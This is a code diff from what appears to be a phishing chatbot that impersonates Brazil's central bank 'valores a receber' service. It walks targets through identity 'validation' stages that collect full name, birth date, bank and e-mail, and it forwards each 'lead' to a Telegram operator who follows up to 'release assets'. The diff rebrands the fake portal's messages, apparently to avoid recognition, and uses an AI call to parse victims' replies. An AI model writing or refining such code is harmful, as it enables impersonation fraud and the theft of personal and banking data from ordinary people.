                 console.log(`[BOT] DIVERGENCE: Typed ${cleanTyped} != Expected ${cleanExpected}`);
-                await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular no portal.\n\nPor gentileza, verifique os dados e informe novamente conforme preenchido anteriormente.\n📌 *Formato:* DD/MM/AAAA`);
+                await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal de Valores*\n\nA data informada não corresponde aos registros cadastrais do titular no portal.\n\nPor gentileza, verifique os dados e informe novamente conforme preenchido anteriormente.\n📌 *Formato:* DD/MM/AAAA`);
                 return;
             }
             console.log(`[BOT] Date MATCH for ${targetChatId}`);
@@ -1360,7 +1361,7 @@ async function processIncomingMessage(msg, targetChatId) {
             // We have a protocol but still no data found on server
             console.log(`[BOT] ERROR: userId ${currentSession.userId} has no data on server. Rejecting to be safe.`);
             await notifyTelegram(`🚨 <b>FALHA DE SINCRONISMO</b>\nLead: <code>${targetChatId}</code>\nID: <code>${currentSession.userId}</code>\n<i>O lead tentou validar mas os dados do portal não foram encontrados. Sistema bloqueou por segurança.</i>`);
-            await sendBotMessage(targetChatId, `⚠️ *ERRO DE SINCRONISMO — Portal SVR*\n\nNão foi possível localizar seu registro de consulta em nossa base de dados central.\n\nPor gentileza, retorne ao site e realize a consulta novamente para gerar um novo protocolo de segurança.`);
+            await sendBotMessage(targetChatId, `⚠️ *ERRO DE SINCRONISMO — Portal de Valores*\n\nNão foi possível localizar seu registro de consulta em nossa base de dados central.\n\nPor gentileza, retorne ao site e realize a consulta novamente para gerar um novo protocolo de segurança.`);
             return;
         } else {
             console.log(`[BOT] Spontaneous lead (no protocol) ${targetChatId}. Proceeding with sanity check.`);
@@ -1408,12 +1409,12 @@ async function processIncomingMessage(msg, targetChatId) {
 
             await sendBotMessage(targetChatId, `✅ *Nome Completo confirmado!*\n\n📍 *FASE 1.3:* Informe o *Nome da sua Instituição Financeira* (Ex: Nubank, Itaú, Caixa, Banco do Brasil, Bradesco, etc):`);
         } else {
-            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
+            const fallback = `⚠️ *Portal de Valores — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
             await sendBotMessage(targetChatId, fallback);
         }
     } else if (currentSession.step === 2.5) {
         let detected = detectBank(text);
-        
+
         // Fallback inteligente com IA se a detecção local falhar
         if (!detected) {
             const aiResult = await askAI(PROMPT_BANCO_EXTRACT, text);
@@ -1525,13 +1526,13 @@ async function processIncomingMessage(msg, targetChatId) {
                 : `Sua solicitação é a próxima a ser processada.`;
 
             await sendBotMessage(targetChatId,
-                `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
+                `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal de Valores*\n\n` +
                 `Prezado(a) *${currentSession.name}*,\n` +
                 `Seu canal de comunicação (${typedEmail}) foi vinculado com sucesso ao processo de resgate.\n\n` +
                 `⌛ *STATUS ATUAL:* Aguardando Processamento Final\n\n` +
                 `${frenteMsg}\n\n` +
                 `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
-                `_Portal SVR — Banco Central do Brasil_`);
+                `_Portal de Valores — Banco Central do Brasil_`);
         } else {
             await sendBotMessage(targetChatId,
                 `⚠️ *E-mail Inválido ou Não Reconhecido*\n\n` +
@@ -1597,7 +1598,7 @@ setInterval(async () => {
                         const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 2);
                         await notifyTelegram(t, session.tgMsgId, r);
                     }
-                    
+
                     // EDITA a mensagem inicial ao invés de mandar uma nova
                     if (session?.assumeMsgId) {
                         try {
@@ -1617,7 +1618,7 @@ setInterval(async () => {
                         const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 3);
                         await notifyTelegram(t, session.tgMsgId, r);
                     }
-                    
+
                     if (session?.assumeMsgId) {
                         try {
                             const msg = await client.getMessageById(session.assumeMsgId);
